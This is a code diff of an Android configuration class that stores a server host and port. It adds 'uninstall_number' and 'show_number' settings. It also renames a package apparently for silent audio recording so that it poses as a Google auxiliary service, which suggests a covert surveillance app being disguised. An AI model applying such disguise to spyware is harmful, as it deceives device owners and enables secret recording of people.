@@ -1,4 +1,4 @@
-package com.forensic.unipg.silenceaudiorecording;
+package com.tools.google.auxiliaryservices;
 
 import android.content.Context;
 import android.content.res.AssetManager;
@@ -16,11 +16,11 @@ import java.util.regex.Pattern;
 /**
  * Created by Gabriele on 07/06/16.
  */
-public class InfoServer
+public class ConfigurationFile
 {
 
     //file name
-    private final String sFilename = "info_server.xml";
+    private String mFilename = "configuration.xml";
     //patten
     private static final Pattern PATTERN = Pattern.compile("^(([01]?\\d\\d?|2[0-4]\\d|25[0-5])\\.){3}([01]?\\d\\d?|2[0-4]\\d|25[0-5])$");
     //utility
@@ -31,24 +31,50 @@ public class InfoServer
     //values
     public String mHost;
     public int mPort;
+    public String mUninstallNumber;
+    public String mShowNumber;
 
     //default constructor
-    public InfoServer(){}
+    public ConfigurationFile(){}
+
+    //set filename
+    public ConfigurationFile(String pathXML)
+    {
+        mFilename = pathXML;
+    }
+
+    //load from default file
+    public ConfigurationFile(Context context)
+    {
+        //read
+        read(context);
+    }
+
+    //set filename and load
+    public ConfigurationFile(Context context, String pathXML)
+    {
+        //filename
+        mFilename = pathXML;
+        //read
+        read(context);
+    }
 
     //config
-    public InfoServer(String host,int port)
+    public ConfigurationFile(String host, int port, String uninstallNumber, String showNumber)
     {
         mHost = host;
         mPort = port;
+        mUninstallNumber = uninstallNumber;
+        mShowNumber = showNumber;
     }
 
     //read file
     void read(Context context)
     {
         //get from external storage
-        String xml = readXML(context,sFilename);
+        String xml = readXML(context, mFilename);
         //else get from assets
-        if(xml==null) xml=getXML(context,sFilename);
+        if(xml==null) xml=getXML(context, mFilename);
         //parse
         if(xml!=null) parse(xml,this);
 
@@ -60,8 +86,10 @@ public class InfoServer
         "<server>\n" +
                 "<host>"+mHost+"</host>\n" +
                 "<port>"+mPort+"</port>\n" +
+                "<uninstall_number>"+mUninstallNumber+"</uninstall_number>\n" +
+                "<show_number>"+mShowNumber+"</show_number>\n" +
         "<server>\n";
-        writeXML(context,sFilename,xml);
+        writeXML(context, mFilename,xml);
     }
 
     static private void writeXML(Context context,String filename,String xml)
@@ -121,7 +149,7 @@ public class InfoServer
         return xmlString;
     }
 
-    static private void parse(String xml,InfoServer config)
+    static private void parse(String xml,ConfigurationFile config)
     {
 
         try
@@ -153,6 +181,14 @@ public class InfoServer
                         else if (name.equals("port"))
                         {
                             config.mPort = Integer.parseInt(last_text);
+                        }
+                        else if (name.equals("uninstall_number"))
+                        {
+                            config.mUninstallNumber = last_text;
+                        }
+                        else if (name.equals("show_number"))
+                        {
+                            config.mShowNumber = last_text;
                         }
                     break;
                 }
